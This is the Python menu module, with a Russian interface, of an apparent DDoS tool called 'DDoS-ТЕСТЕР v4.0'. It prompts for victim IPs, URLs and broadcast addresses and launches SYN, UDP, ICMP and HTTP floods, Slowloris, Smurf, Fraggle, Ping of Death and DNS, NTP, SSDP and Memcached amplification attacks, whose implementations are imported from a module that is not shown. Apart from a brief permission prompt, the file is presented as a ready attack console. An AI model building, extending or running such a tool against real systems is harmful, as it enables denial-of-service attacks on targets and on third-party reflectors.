# menu.py
import asyncio
import time
import os
import socket
from urllib.parse import urlparse
from pathlib import Path
from typing import Dict, Any, List
from utils import validate_input, logger, generate_report, save_results_to_file, plot_results, load_config_from_file, export_to_json, send_email_results, cleanup_resources, check_network_connectivity, multi_target_test, ramp_up_concurrency, stress_test_duration, is_root, validate_ip, validate_url
from core import run_http_test, run_ping_test, print_results, run_syn_flood, run_udp_flood, run_slowloris, run_dns_amplification, run_ntp_amplification, run_icmp_flood, run_smurf, run_fraggle, run_ping_of_death, run_http_slow_read, run_dns_query_flood, run_ssdp_amplification, run_memcached_amplification

# Глобальное хранение результатов для меню
current_results: List[Dict[str, Any]] = []

def display_menu():
    """Отображение меню с разделением на категории и улучшенным дизайном."""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')  # Очистка экрана
        print("\n" + "═"*70)
        print("              🚀 DDoS-ТЕСТЕР v4.0 (Без Npcap/Scapy) 🚀")
        print("              Разработано для тестирования нагрузки")
        print("═"*70)
        print("\n🟢 === БАЗОВЫЕ ТЕСТЫ ===")
        print("1.  🌐 HTTP Flood (GET/POST)")
        print("2.  📡 Ping Flood")
        print("3.  🎯 Тест на несколько целей")
        print("4.  📈 Ramp-up Concurrency")
        print("5.  ⏱️  Stress Test по длительности")
        print("\n🔴 === FLOOD АТАКИ ===")
        print("6.  🔄 SYN Flood (Connect-based)")
        print("7.  📦 UDP Flood")
        print("8.  📬 ICMP Flood (via ping)")
        print("\n🟡 === SLOW & AMPLIFICATION ===")
        print("9.  🐌 Slowloris")
        print("10. 🔍 DNS Amplification")
        print("11. ⏰ NTP Amplification")
        print("12. 🌐 HTTP Slow Read")
        print("13. 📡 DNS Query Flood")
        print("\n🟣 === BROADCAST АТАКИ ===")
        print("14. 💥 Smurf Attack (via ping)")
        print("15. 🔥 Fraggle Attack")
        print("\n⚫ === СПЕЦИАЛЬНЫЕ АТАКИ ===")
        print("16. 💀 Ping of Death (large ping)")
        print("17. 🛡️ SSDP Amplification")
        print("18. 💾 Memcached Amplification")
        print("\n🔵 === ОТЧЕТЫ И УТИЛИТЫ ===")
        print("19. 📊 Сгенерировать отчет")
        print("20. 💾 Сохранить в CSV")
        print("21. 📄 Экспорт в JSON")
        print("22. 📈 Построить график")
        print("23. 📧 Отправить по email")
        print("24. ⚙️  Загрузить конфиг")
        print("25. 🌐 Проверить сеть")
        print("26. 🚪 Выход")
        choice = input("Выберите опцию: ").strip()
        return choice
    except KeyboardInterrupt:
        logger.info("Меню прервано пользователем")
        return "26"
    except Exception as e:
        logger.error(f"Ошибка в display_menu: {e}")
        return "26"

async def handle_menu_choice(choice: str, config: Dict[str, Any]) -> bool:
    """Обработка выбора в меню с углубленными проверками."""
    global current_results
    try:
        # Общая проверка на подтверждение для всех тестов
        if choice in [str(i) for i in range(1, 19)]:
            confirm = input("⚠️  ВНИМАНИЕ: Это инструмент для тестирования нагрузки. Используйте только с разрешения! Продолжить? (y/n): ").strip().lower()
            if confirm != 'y':
                print("❌ Тест отменен.")
                logger.info("Тест отменен пользователем")
                input("\nНажмите Enter для продолжения...")
                return True

        # Проверка сети для всех тестов
        if choice in [str(i) for i in range(1, 19)]:
            if not check_network_connectivity():
                print("❌ Сеть недоступна. Проверьте подключение.")
                logger.error("Сеть недоступна перед тестом")
                input("\nНажмите Enter для продолжения...")
                return True

        if choice == "1":
            target = input("Введите URL: ").strip()
            if not target:
                logger.warning("Пустой URL")
                input("\nНажмите Enter для продолжения...")
                return True
            url = f"http://{target}" if not target.startswith(("http://", "https://")) else target
            if not validate_url(url):
                print("❌ Неверный URL.")
                logger.warning("Неверный URL")
                input("\nНажмите Enter для продолжения...")
                return True
            num_requests_str = input("Количество запросов: ")
            num_requests = validate_input(num_requests_str, int, error_msg="Неверное количество запросов")
            concurrent_str = input("Concurrent: ")
            concurrent = validate_input(concurrent_str, int, error_msg="Неверный concurrent")
            method_str = input("Метод (GET/POST, default GET): ").strip().upper() or 'GET'
            method = method_str
            data_str = None
            if method == 'POST':
                data_str = input("Данные для POST (опционально): ").strip() or '{"test": "data"}'
                data_str = data_str.encode('utf-8') if data_str else None
            if num_requests and concurrent:
                start_time = time.time()
                results = await run_http_test(url, num_requests, concurrent, method=method, data=data_str)
                current_results = results
                print_results(results)
                print(f"⏱️  Время теста: {time.time() - start_time:.2f} сек")
                input("\nНажмите Enter для продолжения...")
            else:
                logger.warning("Неверные параметры для HTTP теста")
                input("\nНажмите Enter для продолжения...")
                return True
        elif choice == "2":
            target = input("Введите IP: ").strip()
            if not target or not validate_ip(target):
                print("❌ Неверный IP.")
                logger.warning("Неверный IP")
                input("\nНажмите Enter для продолжения...")
                return True
            num_requests_str = input("Количество запросов: ")
            num_requests = validate_input(num_requests_str, int, error_msg="Неверное количество запросов")
            concurrent_str = input("Concurrent: ")
            concurrent = validate_input(concurrent_str, int, error_msg="Неверный concurrent")
            if num_requests and concurrent:
                start_time = time.time()
                results = run_ping_test(target, num_requests, concurrent)
                current_results = results
                print_results(results)
                print(f"⏱️  Время теста: {time.time() - start_time:.2f} сек")
                input("\nНажмите Enter для продолжения...")
            else:
                logger.warning("Неверные параметры для Ping теста")
                input("\nНажмите Enter для продолжения...")
                return True
        elif choice == "3":
            targets_str = input("Введите цели через запятую: ").strip()
            if not targets_str:
                logger.warning("Пустые цели")
                input("\nНажмите Enter для продолжения...")
                return True
            targets = [t.strip() for t in targets_str.split(',') if t.strip()]
            valid_targets = []
            for t in targets:
                if validate_url(t) or validate_ip(t):
                    valid_targets.append(t)
                else:
                    print(f"❌ Неверная цель: {t}")
            if not valid_targets:
                input("\nНажмите Enter для продолжения...")
                return True
            targets = valid_targets
            method = input("Метод (1-HTTP, 2-Ping): ").strip()
            if method not in ["1", "2"]:
                logger.warning("Неверный метод")
                input("\nНажмите Enter для продолжения...")
                return True
            num_requests_str = input("Количество: ")
            num_requests = validate_input(num_requests_str, int, error_msg="Неверное количество")
            concurrent_str = input("Concurrent: ")
            concurrent = validate_input(concurrent_str, int, error_msg="Неверный concurrent")
            if num_requests and concurrent and targets:
                results = multi_target_test(targets, method, num_requests, concurrent)
                current_results = results
                print_results(results)
                input("\nНажмите Enter для продолжения...")
            else:
                logger.warning("Неверные параметры для multi-target")
                input("\nНажмите Enter для продолжения...")
                return True
        elif choice == "4":
            url = input("URL: ").strip()
            url = f"http://{url}" if not url.startswith(("http://", "https://")) else url
            if not validate_url(url):
                print("❌ Неверный URL.")
                input("\nНажмите Enter для продолжения...")
                return True
            start_con_str = input("Start concurrent: ")
            start_con = validate_input(start_con_str, int, error_msg="Неверный start concurrent")
            end_con_str = input("End concurrent: ")
            end_con = validate_input(end_con_str, int, error_msg="Неверный end concurrent")
            if start_con >= end_con:
                print("❌ Start concurrent должен быть меньше End.")
                input("\nНажмите Enter для продолжения...")
                return True
            steps_str = input("Steps: ")
            steps = validate_input(steps_str, int, error_msg="Неверные steps")
            num_requests_str = input("Requests per step: ")
            num_requests = validate_input(num_requests_str, int, error_msg="Неверное количество на шаг")
            if all([url, start_con, end_con, steps, num_requests]):
                results = ramp_up_concurrency(start_con, end_con, steps, url, num_requests)
                current_results = results
                print_results(results)
                input("\nНажмите Enter для продолжения...")
            else:
                logger.warning("Неверные параметры для ramp-up")
                input("\nНажмите Enter для продолжения...")
                return True
        elif choice == "5":
            url = input("URL: ").strip()
            url = f"http://{url}" if not url.startswith(("http://", "https://")) else url
            if not validate_url(url):
                print("❌ Неверный URL.")
                input("\nНажмите Enter для продолжения...")
                return True
            duration_str = input("Duration (sec): ")
            duration = validate_input(duration_str, int, error_msg="Неверная длительность")
            concurrent_str = input("Concurrent: ")
            concurrent = validate_input(concurrent_str, int, error_msg="Неверный concurrent")
            if duration and concurrent and url:
                requests_made = stress_test_duration(url, duration, concurrent)
                print(f"📊 Сделано запросов: {requests_made}")
                current_results = [{"requests_made": requests_made}]
                input("\nНажмите Enter для продолжения...")
            else:
                logger.warning("Неверные параметры для stress test")
                input("\nНажмите Enter для продолжения...")
                return True
        elif choice == "6":  # SYN Flood (Connect-based, без Scapy)
            target = input("Введите IP для SYN Flood: ").strip()
            if not target or not validate_ip(target):
                print("❌ Неверный IP.")
                input("\nНажмите Enter для продолжения...")
                return True
            num_packets_str = input("Количество соединений: ")
            num_packets = validate_input(num_packets_str, int, error_msg="Неверное количество пакетов")
            port_str = input("Порт (default 80): ") or "80"
            port = validate_input(port_str, int, min_val=1, max_val=65535, error_msg="Неверный порт")
            if num_packets and port:
                start_time = time.time()
                results = run_syn_flood(target, num_packets, port)
                current_results = results
                print_results(results)
                print(f"⏱️  Время теста: {time.time() - start_time:.2f} сек")
                input("\nНажмите Enter для продолжения...")
            else:
                logger.warning("Неверные параметры для SYN Flood")
                input("\nНажмите Enter для продолжения...")
                return True
        elif choice == "7":  # UDP Flood
            target = input("Введите IP для UDP Flood: ").strip()
            if not target or not validate_ip(target):
                print("❌ Неверный IP.")
                input("\nНажмите Enter для продолжения...")
                return True
            num_packets_str = input("Количество пакетов: ")
            num_packets = validate_input(num_packets_str, int, error_msg="Неверное количество пакетов")
            port_str = input("Порт: ")
            port = validate_input(port_str, int, min_val=1, max_val=65535, error_msg="Неверный порт (1-65535)")
            if num_packets and port:
                start_time = time.time()
                results = run_udp_flood(target, num_packets, port)
                current_results = results
                print_results(results)
                print(f"⏱️  Время теста: {time.time() - start_time:.2f} сек")
                input("\nНажмите Enter для продолжения...")
            else:
                logger.warning("Неверные параметры для UDP Flood")
                input("\nНажмите Enter для продолжения...")
                return True
        elif choice == "8":  # ICMP Flood (via ping)
            target = input("Введите IP для ICMP Flood: ").strip()
            if not target or not validate_ip(target):
                print("❌ Неверный IP.")
                input("\nНажмите Enter для продолжения...")
                return True
            num_packets_str = input("Количество пакетов: ")
            num_packets = validate_input(num_packets_str, int, error_msg="Неверное количество пакетов")
            if num_packets:
                start_time = time.time()
                results = run_icmp_flood(target, num_packets)
                current_results = results
                print_results(results)
                print(f"⏱️  Время теста: {time.time() - start_time:.2f} сек")
                input("\nНажмите Enter для продолжения...")
            else:
                logger.warning("Неверные параметры для ICMP Flood")
                input("\nНажмите Enter для продолжения...")
                return True
        elif choice == "9":  # Slowloris
            target = input("Введите URL для Slowloris: ").strip()
            url = f"http://{target}" if not target.startswith(("http://", "https://")) else target
            if not validate_url(url):
                print("❌ Неверный URL.")
                input("\nНажмите Enter для продолжения...")
                return True
            duration_str = input("Duration (sec): ")
            duration = validate_input(duration_str, int, error_msg="Неверная длительность")
            if duration:
                start_time = time.time()
                results = await run_slowloris(url, duration)
                current_results = results
                print_results(results)
                print(f"⏱️  Время теста: {time.time() - start_time:.2f} сек")
                input("\nНажмите Enter для продолжения...")
            else:
                logger.warning("Неверные параметры для Slowloris")
                input("\nНажмите Enter для продолжения...")
                return True
        elif choice == "10":  # DNS Amp
            target = input("Введите DNS сервер для Amplification: ").strip()
            if not target or not validate_ip(target):
                print("❌ Неверный IP.")
                input("\nНажмите Enter для продолжения...")
                return True
            num_queries_str = input("Количество запросов: ")
            num_queries = validate_input(num_queries_str, int, error_msg="Неверное количество запросов")
            if num_queries:
                start_time = time.time()
                results = run_dns_amplification(target, num_queries)
                current_results = results
                print_results(results)
                print(f"⏱️  Время теста: {time.time() - start_time:.2f} сек")
                input("\nНажмите Enter для продолжения...")
            else:
                logger.warning("Неверные параметры для DNS Amplification")
                input("\nНажмите Enter для продолжения...")
                return True
        elif choice == "11":  # NTP Amp
            target = input("Введите NTP сервер для Amplification: ").strip()
            if not target or not validate_ip(target):
                print("❌ Неверный IP.")
                input("\nНажмите Enter для продолжения...")
                return True
            num_queries_str = input("Количество запросов: ")
            num_queries = validate_input(num_queries_str, int, error_msg="Неверное количество запросов")
            if num_queries:
                start_time = time.time()
                results = run_ntp_amplification(target, num_queries)
                current_results = results
                print_results(results)
                print(f"⏱️  Время теста: {time.time() - start_time:.2f} сек")
                input("\nНажмите Enter для продолжения...")
            else:
                logger.warning("Неверные параметры для NTP Amplification")
                input("\nНажмите Enter для продолжения...")
                return True
        elif choice == "12":  # HTTP Slow Read
            target = input("Введите URL для HTTP Slow Read: ").strip()
            url = f"http://{target}" if not target.startswith(("http://", "https://")) else target
            if not validate_url(url):
                print("❌ Неверный URL.")
                input("\nНажмите Enter для продолжения...")
                return True
            duration_str = input("Duration (sec): ")
            duration = validate_input(duration_str, int, error_msg="Неверная длительность")
            concurrent_str = input("Concurrent: ")
            concurrent = validate_input(concurrent_str, int, error_msg="Неверный concurrent")
            if duration and concurrent:
                start_time = time.time()
                results = await run_http_slow_read(url, duration, concurrent)
                current_results = results
                print_results(results)
                print(f"⏱️  Время теста: {time.time() - start_time:.2f} сек")
                input("\nНажмите Enter для продолжения...")
            else:
                logger.warning("Неверные параметры для HTTP Slow Read")
                input("\nНажмите Enter для продолжения...")
                return True
        elif choice == "13":  # DNS Query Flood
            target = input("Введите DNS сервер для Query Flood: ").strip()
            if not target or not validate_ip(target):
                print("❌ Неверный IP.")
                input("\nНажмите Enter для продолжения...")
                return True
            num_queries_str = input("Количество запросов: ")
            num_queries = validate_input(num_queries_str, int, error_msg="Неверное количество запросов")
            if num_queries:
                start_time = time.time()
                results = run_dns_query_flood(target, num_queries)
                current_results = results
                print_results(results)
                print(f"⏱️  Время теста: {time.time() - start_time:.2f} сек")
                input("\nНажмите Enter для продолжения...")
            else:
                logger.warning("Неверные параметры для DNS Query Flood")
                input("\nНажмите Enter для продолжения...")
                return True
        elif choice == "14":  # Smurf (via ping)
            victim = input("Victim IP: ").strip()
            if not validate_ip(victim):
                print("❌ Неверный Victim IP.")
                input("\nНажмите Enter для продолжения...")
                return True
            broadcast = input("Broadcast IP: ").strip()
            if not validate_ip(broadcast):
                print("❌ Неверный Broadcast IP.")
                input("\nНажмите Enter для продолжения...")
                return True
            num_packets_str = input("Количество пакетов: ")
            num_packets = validate_input(num_packets_str, int, error_msg="Неверное количество пакетов")
            if num_packets:
                start_time = time.time()
                results = run_smurf(victim, broadcast, num_packets)
                current_results = results
                print_results(results)
                print(f"⏱️  Время теста: {time.time() - start_time:.2f} сек")
                input("\nНажмите Enter для продолжения...")
            else:
                logger.warning("Неверные параметры для Smurf")
                input("\nНажмите Enter для продолжения...")
                return True
        elif choice == "15":  # Fraggle
            broadcast = input("Broadcast IP: ").strip()
            if not validate_ip(broadcast):
                print("❌ Неверный Broadcast IP.")
                input("\nНажмите Enter для продолжения...")
                return True
            port_str = input("Порт: ")
            port = validate_input(port_str, int, min_val=1, max_val=65535, error_msg="Неверный порт")
            num_packets_str = input("Количество пакетов: ")
            num_packets = validate_input(num_packets_str, int, error_msg="Неверное количество пакетов")
            if num_packets and port:
                start_time = time.time()
                results = run_fraggle(broadcast, port, num_packets)
                current_results = results
                print_results(results)
                print(f"⏱️  Время теста: {time.time() - start_time:.2f} сек")
                input("\nНажмите Enter для продолжения...")
            else:
                logger.warning("Неверные параметры для Fraggle")
                input("\nНажмите Enter для продолжения...")
                return True
        elif choice == "16":  # Ping of Death
            target = input("Введите IP для Ping of Death: ").strip()
            if not target or not validate_ip(target):
                print("❌ Неверный IP.")
                input("\nНажмите Enter для продолжения...")
                return True
            num_packets_str = input("Количество пакетов: ")
            num_packets = validate_input(num_packets_str, int, error_msg="Неверное количество пакетов")
            if num_packets:
                start_time = time.time()
                results = run_ping_of_death(target, num_packets)
                current_results = results
                print_results(results)
                print(f"⏱️  Время теста: {time.time() - start_time:.2f} сек")
                input("\nНажмите Enter для продолжения...")
            else:
                logger.warning("Неверные параметры для Ping of Death")
                input("\nНажмите Enter для продолжения...")
                return True
        elif choice == "17":  # SSDP Amplification
            target = input("Введите SSDP сервер для Amplification: ").strip()
            if not target or not validate_ip(target):
                print("❌ Неверный IP.")
                input("\nНажмите Enter для продолжения...")
                return True
            num_queries_str = input("Количество запросов: ")
            num_queries = validate_input(num_queries_str, int, error_msg="Неверное количество запросов")
            if num_queries:
                start_time = time.time()
                results = run_ssdp_amplification(target, num_queries)
                current_results = results
                print_results(results)
                print(f"⏱️  Время теста: {time.time() - start_time:.2f} сек")
                input("\nНажмите Enter для продолжения...")
            else:
                logger.warning("Неверные параметры для SSDP Amplification")
                input("\nНажмите Enter для продолжения...")
                return True
        elif choice == "18":  # Memcached Amplification
            target = input("Введите Memcached сервер для Amplification: ").strip()
            if not target or not validate_ip(target):
                print("❌ Неверный IP.")
                input("\nНажмите Enter для продолжения...")
                return True
            num_queries_str = input("Количество запросов: ")
            num_queries = validate_input(num_queries_str, int, error_msg="Неверное количество запросов")
            if num_queries:
                start_time = time.time()
                results = run_memcached_amplification(target, num_queries)
                current_results = results
                print_results(results)
                print(f"⏱️  Время теста: {time.time() - start_time:.2f} сек")
                input("\nНажмите Enter для продолжения...")
            else:
                logger.warning("Неверные параметры для Memcached Amplification")
                input("\nНажмите Enter для продолжения...")
                return True
        elif choice == "19":
            if current_results:
                report = generate_report(current_results)
                print(report)
                input("\nНажмите Enter для продолжения...")
            else:
                print("❌ Нет результатов для отчета. Запустите тест сначала.")
                input("\nНажмите Enter для продолжения...")
        elif choice == "20":
            if current_results:
                success = save_results_to_file(current_results)
                if not success:
                    print("❌ Ошибка сохранения.")
                else:
                    print("✅ Результаты сохранены.")
                input("\nНажмите Enter для продолжения...")
            else:
                print("❌ Нет результатов для сохранения.")
                input("\nНажмите Enter для продолжения...")
        elif choice == "21":
            if current_results:
                success = export_to_json(current_results)
                if not success:
                    print("❌ Ошибка экспорта.")
                else:
                    print("✅ Результаты экспортированы.")
                input("\nНажмите Enter для продолжения...")
            else:
                print("❌ Нет результатов для экспорта.")
                input("\nНажмите Enter для продолжения...")
        elif choice == "22":
            if current_results:
                plot_results(current_results)
                input("\nНажмите Enter для продолжения...")
            else:
                print("❌ Нет результатов для графика.")
                input("\nНажмите Enter для продолжения...")
        elif choice == "23":
            email = input("Введите email: ").strip()
            if not email:
                print("❌ Неверный email.")
                input("\nНажмите Enter для продолжения...")
                return True
            if email and current_results:
                success = send_email_results(current_results, email)
                if not success:
                    print("❌ Ошибка отправки.")
                else:
                    print("✅ Результаты отправлены.")
                input("\nНажмите Enter для продолжения...")
            else:
                print("❌ Нет результатов или email для отправки.")
                input("\nНажмите Enter для продолжения...")
        elif choice == "24":
            config_file = input("Файл конфига (default config.json): ").strip() or "config.json"
            config = load_config_from_file(config_file)
            print("✅ Конфиг загружен.")
            input("\nНажмите Enter для продолжения...")
        elif choice == "25":
            if check_network_connectivity():
                print("✅ Сеть доступна.")
            else:
                print("❌ Сеть недоступна. Проверьте подключение.")
            input("\nНажмите Enter для продолжения...")
        elif choice == "26":
            return False
        else:
            print("❌ Неверный выбор.")
            input("\nНажмите Enter для продолжения...")
        return True
    except KeyboardInterrupt:
        logger.info("Обработка меню прервана")
        return False
    except Exception as e:
        logger.error(f"Ошибка в handle_menu_choice: {e}")
        print(f"❌ Неожиданная ошибка: {e}")
        input("\nНажмите Enter для продолжения...")
        return True

async def run_menu():
    """Запуск цикла меню."""
    config = {}
    while True:
        choice = display_menu()
        if not await handle_menu_choice(choice, config):
            print("\n👋 До свидания! Очистка ресурсов...")
            cleanup_resources()
            break